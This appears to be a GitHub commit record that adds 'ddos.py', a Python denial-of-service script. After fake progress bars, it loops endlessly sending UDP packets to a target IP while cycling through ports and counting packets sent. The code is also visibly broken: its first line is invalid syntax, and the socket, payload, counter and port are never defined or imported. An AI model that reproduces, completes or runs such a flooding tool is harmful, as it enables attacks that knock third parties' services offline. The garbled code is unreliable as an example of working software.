c8c6a3ccd96a06063813689c991f36f63dfbc087
JustAHacker <116762253+I-can-ddos@users.noreply.github.com>
2023-06-29 16:29:30 +0200

    ddos.py
    created by __bond007__

---
+++ ddos.py
@@ -0,0 +1,17 @@
+int (ip :)
+print("======25%")
+time.sleep(3)
+print("==========50%")
+time.sleep(5)
+print("====================100%")
+try:
+    while True:
+         sock.sendto(bytes, (ip,port))
+         sent = sent + 1
+         port = port + 1
+         print ("Sended %s packets to %s to port:%s"%(sent,ip,port))
+         if port == 65534:
+           port = 1
+except KeyboardInterrupt:
+    os.system("figlet DDos Attack Stoped !")
+    exit()
